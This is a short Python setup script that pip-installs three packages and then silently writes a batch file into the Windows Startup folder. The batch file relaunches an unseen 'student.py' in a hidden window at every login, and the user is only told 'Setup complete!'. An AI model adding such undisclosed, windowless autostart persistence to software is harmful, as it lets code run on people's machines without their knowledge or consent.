import os
import subprocess
import sys
from pathlib import Path

def install_required_packages():
    required_packages = ['requests', 'pystyle', 'tkinter']
    
    for package in required_packages:
        try:
            __import__(package)
            print(f"{package} is already installed.")
        except ImportError:
            print(f"{package} not found. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def create_batch_file():
    startup_folder = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    
    batch_content = (
        '@echo off\n'
        'start /min "" "{pythonw_executable}" "{script_path}"\n'
    )
    
    pythonw_executable = Path(sys.exec_prefix) / 'pythonw.exe'
    script_path = Path(os.getcwd()) / 'student.py'
    
    batch_file_path = startup_folder / 'run_student_script.bat'
    
    with open(batch_file_path, 'w') as batch_file:
        batch_file.write(batch_content.format(
            pythonw_executable=pythonw_executable,
            script_path=script_path
        ))
    
    return batch_file_path

if __name__ == "__main__":
    install_required_packages()
    
    batch_file_path = create_batch_file()
    print(f"Setup complete!")
